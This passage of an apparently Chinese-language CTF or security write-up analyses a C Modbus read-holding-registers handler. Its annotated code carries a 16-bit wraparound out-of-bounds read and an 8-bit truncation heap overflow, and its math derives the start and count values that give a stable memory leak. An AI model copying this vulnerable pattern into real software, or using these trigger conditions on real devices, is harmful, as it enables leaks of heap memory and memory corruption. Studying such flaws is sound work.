0x02</span></span><br><span class="line">        modbus_send_exception(s, addr, MODBUS_FC_READ_HOLDING,</span><br><span class="line">                              MODBUS_EX_ILLEGAL_DATA_ADDR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界读 说明2：稳定泄露与堆溢出的分界】</span></span><br><span class="line">    <span class="comment">// 下面把 2*count 放入 uint8_t（byte_count），当 count ≥ 128 时会发生 8 位截断，</span></span><br><span class="line">    <span class="comment">// 随后 out_len=3+byte_count+2 会“少分配”，而 for 循环仍按真实 count 拷贝数据，</span></span><br><span class="line">    <span class="comment">// 会导致堆溢出（这是附带的另一个漏洞）。为“稳定泄露 OOB 读”，建议 count ≤ 127。</span></span><br><span class="line">    <span class="type">uint8_t</span> byte_count = count * <span class="number">2</span>;               <span class="comment">// 8 位截断 → count≥128 时将发生“少分配”</span></span><br><span class="line">    <span class="type">size_t</span> out_len = <span class="number">3</span> + byte_count + <span class="number">2</span>;          <span class="comment">// addr, func, bc, data..., crc</span></span><br><span class="line">    <span class="type">uint8_t</span> *out = g_malloc(out_len);             <span class="comment">// 可能少分配（见上注）</span></span><br><span class="line"></span><br><span class="line">    out[<span class="number">0</span>] = addr;</span><br><span class="line">    out[<span class="number">1</span>] = MODBUS_FC_READ_HOLDING;</span><br><span class="line">    out[<span class="number">2</span>] = byte_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界读 触发点：真实访问 regs[start + i]】</span></span><br><span class="line">    <span class="comment">// 实际读出的内存区间（相对 regs 基址 B）：</span></span><br><span class="line">    <span class="comment">//   [ B + 2*start , B + 2*(start + count - 1) ]（总长度 2*count 字节）</span></span><br><span class="line">    <span class="comment">// 当 start 足够大时，将跨出 regs[256]（仅 512 字节），把后续堆对象数据打包返回。</span></span><br><span class="line">    <span class="type">size_t</span> p = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint16_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">uint16_t</span> v = s-&gt;regs[start + i];</span><br><span class="line">        out[p++] = (<span class="type">uint8_t</span>)(v &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        out[p++] = (<span class="type">uint8_t</span>)(v &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算并填充 CRC（低字节在前）</span></span><br><span class="line">    <span class="type">uint16_t</span> crc = modbus_crc16(out, out_len - <span class="number">2</span>);</span><br><span class="line">    out[out_len - <span class="number">2</span>] = (<span class="type">uint8_t</span>)(crc &amp; <span class="number">0xFF</span>);</span><br><span class="line">    out[out_len - <span class="number">1</span>] = (<span class="type">uint8_t</span>)(crc &gt;&gt; <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    modbus_send(s, out, out_len);</span><br><span class="line">    g_free(out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>每个寄存器 2 字节，读 <code>count</code> 个寄存器，<strong>读取字节区间</strong> &#x3D; <code>[2*start, 2*(start + count - 1)]</code>（相对 <code>regs_base</code>）。</p>
<p>读取数据时使用的 <code>start</code> 和 <code>count</code> 需要满足如下条件：</p>
<ul>
<li><strong>通过地址检查</strong>：<code>count &gt;= 1</code> 且 <strong><code>(uint16_t)(start + count) &lt;= 0x100</code></strong> （16 位环回） </li>
<li><strong>避免堆溢出</strong>：由于回包分配长度用 <code>byte_count = (uint8_t)(2*count)</code>，当 <code>count ≥ 128</code> 时会<strong>少分配</strong>导致<strong>堆溢出</strong>。我们若只想“稳定泄露而不崩”，取 <strong><code>count ≤ 127</code></strong> 即可。</li>
</ul>
<hr>
<p>代码允许处理当且仅当：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>≥</mo><mtext> </mtext><mn>1</mn><mspace width="1em"/><mtext>且</mtext><mspace width="1em"/><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">(</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msup><mn>2</mn><mn>16</mn></msup><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">)</mo><mtext> </mtext><mo>≤</mo><mtext> </mtext><mn>256.</mn></mrow><annotation encoding="application/x-tex">
\mathbf{count}\ \ge\ 1
\quad\text{且}\quad
\bigl((\mathbf{start}+\mathbf{count}) \bmod 2^{16}\bigr)\ \le\ 256.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord text"><span class="mord cjk_fallback">且</span></span><span class="mspace" style="margin-right:1em;"></span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2141em;vertical-align:-0.35em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">16</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing size1">)</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256.</span></span></span></span></span>

<p>把条件改写为允许的 <code>start</code> 取值集合（对固定的 <code>count</code>）：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>∈</mo><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo separator="true">,</mo><mtext> </mtext><mn>256</mn><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mtext>  </mtext><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mtext> </mtext><msup><mn>2</mn><mn>16</mn></msup><mo stretchy="false">)</mo><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">
\boxed{\
\mathbf{start}\ \in\ \bigl[-\mathbf{count},\ 256-\mathbf{count}\bigr]\ \ (\bmod\ 2^{16})\
}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.8941em;vertical-align:-0.69em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2041em;"><span style="top:-3.8941em;"><span class="pstrut" style="height:3.8941em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace"> </span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mord">−</span><span class="mord"><span class="mord mathbf">count</span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace"> </span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">16</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span></span></span></span></span><span style="top:-3.2041em;"><span class="pstrut" style="height:3.8941em;"></span><span class="stretchy fbox" style="height:1.8941em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.69em;"><span></span></span></span></span></span></span></span></span></span>

<p>进一步按 <code>count</code> 的大小描述为具体区间：</p>
<ul>
<li>若 <code>count &lt;= 256</code>：</li>
</ul>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>∈</mo><mtext> </mtext><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mtext> </mtext><mn>256</mn><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">]</mo><mtext> </mtext><mo>∪</mo><mtext> </mtext><mo stretchy="false">[</mo><mn>65536</mn><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo separator="true">,</mo><mtext> </mtext><mn>65535</mn><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\mathbf{start}\ \in\ [0,\ 256-\mathbf{count}] \ \cup\ [65536-\mathbf{count},\ 65535].
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.674em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">]</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">65536</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">65535</span><span class="mclose">]</span><span class="mord">.</span></span></span></span></span>

<ul>
<li>若 <code>count &gt; 256</code>（仍然是 257 个允许值，只是整体落在高端一段）：</li>
</ul>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>∈</mo><mtext> </mtext><mo stretchy="false">[</mo><mn>65536</mn><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo separator="true">,</mo><mtext> </mtext><mn>65536</mn><mo>+</mo><mn>256</mn><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">]</mo><mtext>  </mtext><mo stretchy="false">(</mo><mtext>在 </mtext><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo><mtext> 上视作模 </mtext><msup><mn>2</mn><mn>16</mn></msup><mtext> 的连续区间</mtext><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\mathbf{start}\ \in\ [65536-\mathbf{count},\ 65536+256-\mathbf{count}]\ \ (\text{在 }[0,65535]\text{ 上视作模 }2^{16}\text{ 的连续区间}).
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.674em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">65536</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">65536</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">]</span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">在</span><span class="mord"> </span></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">65535</span><span class="mclose">]</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">上视作模</span><span class="mord"> </span></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">16</span></span></span></span></span></span></span></span></span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">的连续区间</span></span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span>

<hr>
<p>读循环按<strong>真实</strong>索引访问：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext mathvariant="monospace">v</mtext><mo>=</mo><mrow><mtext mathvariant="monospace">s-&gt;regs[</mtext><mtext> </mtext><mtext mathvariant="monospace">start</mtext><mtext> </mtext><mtext mathvariant="monospace">+</mtext><mtext> </mtext><mtext mathvariant="monospace">i</mtext><mtext> </mtext><mtext mathvariant="monospace">]</mtext></mrow><mo separator="true">,</mo><mspace width="1em"/><mi>i</mi><mo>=</mo><mn>0..</mn><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>−</mo><mn>1.</mn></mrow><annotation encoding="application/x-tex">
\texttt{v} = \texttt{s-&gt;regs[ start + i ]},\quad i=0.. \mathbf{count}-1.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord texttt">v</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9167em;vertical-align:-0.2222em;"></span><span class="mord text"><span class="mord texttt">s-&gt;regs[ start + i ]</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0..</span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1.</span></span></span></span></span>

<p>因此相对 <code>B</code> 的<strong>字节范围</strong>为：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">
\boxed{\
\bigl[\, 2\cdot\mathbf{start}\ ,\ 2\cdot(\mathbf{start}+\mathbf{count})-1 \,\bigr]\
}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.88em;vertical-align:-0.69em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span style="top:-3.88em;"><span class="pstrut" style="height:3.88em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace"> </span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mspace"> </span></span></span></span></span><span style="top:-3.19em;"><span class="pstrut" style="height:3.88em;"></span><span class="stretchy fbox" style="height:1.88em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.69em;"><span></span></span></span></span></span></span></span></span></span>
<p>总长度为：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mtext> 字节</mtext><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\boxed{\,2\cdot\mathbf{count}\ \text{字节}\, }.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3633em;vertical-align:-0.34em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0233em;"><span style="top:-3.3633em;"><span class="pstrut" style="height:3.3633em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace"> </span><span class="mord text"><span class="mord cjk_fallback">字节</span></span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-3.0233em;"><span class="pstrut" style="height:3.3633em;"></span><span class="stretchy fbox" style="height:1.3633em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.34em;"><span></span></span></span></span></span><span class="mord">.</span></span></span></span></span>

<p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>≥</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">\mathbf{start}\ge 256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>−</mo><mn>1</mn><mo>≥</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">\mathbf{start}+\mathbf{count}-1 \ge 256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7183em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7183em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256</span></span></span></span> 时，上述区间越过合法的 <code>[0..511]</code>，形成<strong>越界读</strong>。</p>
<hr>
<p>FC03 回包分配与实际写入不一致：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>byte_count</mtext><mo>=</mo><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">(</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">)</mo><mtext> </mtext><mi mathvariant="normal">&amp;</mi><mtext> </mtext><mn>0</mn><mi>x</mi><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi></mrow><mo separator="true">,</mo><mspace width="2em"/><mtext>out_len</mtext><mo>=</mo><mn>3</mn><mo>+</mo><mtext>byte_count</mtext><mo>+</mo><mn>2</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">
\text{byte\_count} = \bigl(2\cdot \mathbf{count}\bigr)\ \&amp;\ 0x\mathrm{FF},
\qquad
\text{out\_len} = 3 + \text{byte\_count} + 2,
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">byte_count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose"><span class="delimsizing size1">)</span></span><span class="mspace"> </span><span class="mord">&amp;</span><span class="mspace"> </span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">FF</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:2em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">out_len</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span 